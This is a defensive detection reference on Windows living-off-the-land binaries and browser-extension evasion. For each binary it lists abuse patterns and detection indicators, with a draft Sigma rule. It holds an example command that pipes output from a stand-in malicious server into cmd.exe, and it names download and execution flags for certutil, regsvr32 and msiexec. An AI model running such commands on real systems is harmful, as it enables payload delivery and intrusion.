# Living Off The Land (LOTL) Binaries Reference

Detection indicators for Windows binaries commonly abused by threat actors for C2, payload delivery, and evasion.

---

## High-Priority LOTL Binaries

### finger.exe
**Path:** `C:\Windows\System32\finger.exe`
**Legitimate Use:** Retrieve information about users on remote systems (legacy protocol)
**Abuse Pattern:** Fetch data from malicious servers and pipe to command line

**Detection Indicators:**
- `finger.exe` being renamed or copied to unusual locations
- `finger.exe` making outbound connections to non-port-79 destinations
- `finger.exe` output being piped to `cmd.exe` or `powershell.exe`
- `finger.exe` executed by non-administrative users
- Parent process is browser, Office app, or script interpreter

**Example Malicious Usage:**
```
finger.exe @malicious-server.com | cmd.exe
```

**Sigma Rule Concept:**
```yaml
title: Suspicious finger.exe Usage
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\finger.exe'
  filter_legit:
    DestinationPort: 79
    ParentImage|endswith:
      - '\cmd.exe'
      - '\explorer.exe'
  condition: selection and not filter_legit
```

---

### certutil.exe
**Path:** `C:\Windows\System32\certutil.exe`
**Legitimate Use:** Certificate management
**Abuse Pattern:** Download files, decode payloads, bypass AV

**Detection Indicators:**
- `-urlcache` flag with external URLs
- `-decode` with suspicious file paths
- Output to temp directories

---

### mshta.exe
**Path:** `C:\Windows\System32\mshta.exe`
**Legitimate Use:** Execute HTA files
**Abuse Pattern:** Execute inline VBScript/JScript, fetch remote payloads

**Detection Indicators:**
- Execution with `vbscript:` or `javascript:` inline
- Network connections to external hosts
- Child process spawning cmd/powershell

---

### rundll32.exe
**Path:** `C:\Windows\System32\rundll32.exe`
**Legitimate Use:** Execute DLL functions
**Abuse Pattern:** Execute malicious DLLs, proxy execution

**Detection Indicators:**
- DLL paths outside System32/SysWOW64
- Unusual export functions (non-standard names)
- Network activity from rundll32

---

### regsvr32.exe
**Path:** `C:\Windows\System32\regsvr32.exe`
**Legitimate Use:** Register COM objects
**Abuse Pattern:** Execute scriptlets via /i: parameter (Squiblydoo)

**Detection Indicators:**
- `/i:` parameter with URLs
- `/s` silent flag with network activity
- Unusual parent processes

---

### bitsadmin.exe
**Path:** `C:\Windows\System32\bitsadmin.exe`
**Legitimate Use:** Background file transfers
**Abuse Pattern:** Download payloads from C2

**Detection Indicators:**
- `/transfer` with external URLs
- `/setnotifycmdline` for persistence
- Jobs created by non-SYSTEM users

---

### wmic.exe
**Path:** `C:\Windows\System32\wbem\wmic.exe`
**Legitimate Use:** WMI command-line interface
**Abuse Pattern:** Remote execution, process creation, reconnaissance

**Detection Indicators:**
- `process call create` with encoded commands
- `/node:` with external IPs
- Output redirection to files

---

### msiexec.exe
**Path:** `C:\Windows\System32\msiexec.exe`
**Legitimate Use:** Install MSI packages
**Abuse Pattern:** Execute remote MSI payloads

**Detection Indicators:**
- `/i` with HTTP/HTTPS URLs
- `/q` quiet install from untrusted sources
- Network connections to non-Microsoft domains

---

## Browser Extension Evasion Patterns

### Chrome Alarms API Delay
**Technique:** Use Chrome's Alarms API to delay malicious execution

**Indicators:**
- Extensions registering alarms with 60+ minute delays
- Alarm callbacks triggering network requests
- Decoupling installation time from malicious activity

**Detection Pattern:**
```javascript
// Red flag in extension analysis
chrome.alarms.create('suspicious', {
  delayInMinutes: 60,  // Long delay = evasion
  periodInMinutes: 10  // Then frequent checks
});
```

### Extension Code Clone Analysis
**Technique:** Byte-for-byte clone of legitimate extension with malicious additions

**Indicators:**
- Near-identical code to known legitimate extensions
- Find/replace branding changes
- Broken URLs from incomplete replacements
- Additional obfuscated JS files

**Detection Workflow:**
```bash
# Compare suspect extension to known-good
diff -r suspect_extension/ legitimate_extension/

# Look for:
# - Brand name replacements
# - Broken URLs
# - Additional files not in original
# - Modified manifest.json permissions
```

---

## Resources

- **LOLBAS Project:** https://lolbas-project.github.io/
- **GTFOBins (Linux):** https://gtfobins.github.io/
- **MITRE ATT&CK:** T1218 (System Binary Proxy Execution)

---

**Last Updated:** 2026-01-23
**Source:** Matt Johansen security research, Huntress analysis
